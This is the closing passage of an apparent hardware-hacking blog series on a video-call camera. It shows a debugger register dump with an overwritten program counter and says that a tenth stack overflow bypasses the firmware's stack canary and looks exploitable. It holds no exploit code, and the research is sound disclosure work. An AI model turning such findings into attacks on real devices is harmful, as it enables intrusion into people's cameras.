$sp  : 0xb51a6a30  →  "eeeeeeeeee"
$lr  : 0x0041ddf4  →   mvn r7,  #0
$pc  : 0xa646464  ("ddd\n"?)
$cpsr: [negative ZERO carry overflow interrupt fast thumb]
```

It only took about 10 stack overflows, but we FINALLY have control of *pc* with a memory corruption! Not going to lie this was my actual reaction when this worked:

![my_actual_reaction.gif](/assets/images/video_call_camera_p4/my_actual_reaction.gif)

# Conclusion

At least they had the awareness that their code would likely have a bunch of stack overflows and used a stack canary (they probably did most of their string processing in the stack to make the most of the canary mitigation) - even if they did do it slightly unconventionally it still mitigated pretty much all but one of the discovered stack overflows thanks to that pesky null byte! On the bright side, our tenth stack overflow should be exploitable!

![tenth_times_a_charm.gif](/assets/images/video_call_camera_p4/tenth_times_a_charm.gif)
